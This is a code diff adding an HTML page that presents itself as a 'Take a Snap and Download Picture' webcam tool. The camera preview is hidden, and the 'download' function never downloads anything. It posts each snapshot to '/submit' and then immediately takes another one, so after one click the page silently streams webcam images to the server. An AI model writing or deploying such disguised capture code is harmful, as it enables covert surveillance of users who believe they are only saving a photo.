@@ -1,0 +1,106 @@
+<html>
+<head>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/webcamjs/1.0.25/webcam.js"></script>
+</head>
+
+<body>
+    <div id="camera" style="display:none"></div>
+    <input type="button" value="Take a Snap and Download Picture" id="btPic" 
+        onclick="takeSnapShot()" />
+    <canvas id="canvas" style="display:none"></canvas>
+</body>
+
+<script>
+
+//resize the image and draw it to the canvas
+function resizeImage(imagePath, newWidth, newHeight) {
+    //create an image object from the path
+    const originalImage = new Image();
+    originalImage.src = imagePath;
+ 
+    //get a reference to the canvas
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+     
+    //wait for the image to load
+    originalImage.addEventListener('load', function() {
+        
+        //get the original image size and aspect ratio
+        const originalWidth = originalImage.naturalWidth;
+        const originalHeight = originalImage.naturalHeight;
+        const aspectRatio = originalWidth/originalHeight;
+ 
+        //if the new height wasn't specified, use the width and the original aspect ratio
+        if (newHeight === undefined) {
+            //calculate the new height
+            newHeight = newWidth/aspectRatio;
+            newHeight = Math.floor(newHeight);
+            
+            //update the input element with the new height
+            hInput.placeholder = `Height (${newHeight})`;
+            hInput.value = newHeight;
+        }
+      
+        //set the canvas size
+        canvas.width = newWidth;
+        canvas.height = newHeight;
+         
+        //render the image
+        ctx.drawImage(originalImage, 0, 0, newWidth, newHeight);
+    });
+}
+
+function dataURItoBlob(dataURI) {
+  // convert base64 to raw binary data held in a string
+  // doesn't handle URLEncoded DataURIs - see SO answer #6850276 for code that does this
+  var byteString = atob(dataURI.split(',')[1]);
+
+  // separate out the mime component
+  var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0]
+
+  // write the bytes of the string to an ArrayBuffer
+  var ab = new ArrayBuffer(byteString.length);
+
+  // create a view into the buffer
+  var ia = new Uint8Array(ab);
+
+  // set the bytes of the buffer to the correct values
+  for (var i = 0; i < byteString.length; i++) {
+      ia[i] = byteString.charCodeAt(i);
+  }
+
+  // write the ArrayBuffer to a blob, and you're done
+  var blob = new Blob([ab], {type: mimeString});
+  return blob;
+
+}
+    // CAMERA SETTINGS.
+    Webcam.set({
+        width: 220,
+        height: 190,
+        image_format: 'jpeg',
+        jpeg_quality: 100
+    });
+    Webcam.attach('#camera');
+    
+    // TAKE A SNAPSHOT.
+    takeSnapShot = function (){
+        Webcam.snap(function (imbeggingdontchangethis, x, y) {
+            downloadImage(imbeggingdontchangethis);
+        });
+    }
+
+    // DOWNLOAD THE IMAGE.
+    downloadImage = function (datauri) {
+        resizeImage(datauri, 250, 250);
+        var blob = dataURItoBlob(datauri);
+var fd = new FormData(document.forms[0]);
+var xhr = new XMLHttpRequest();
+
+fd.append("file", blob);
+xhr.open('POST', '/submit', true);
+xhr.addEventListener("load", takeSnapShot)
+xhr.send(fd);
+    }
+</script>
+</html>
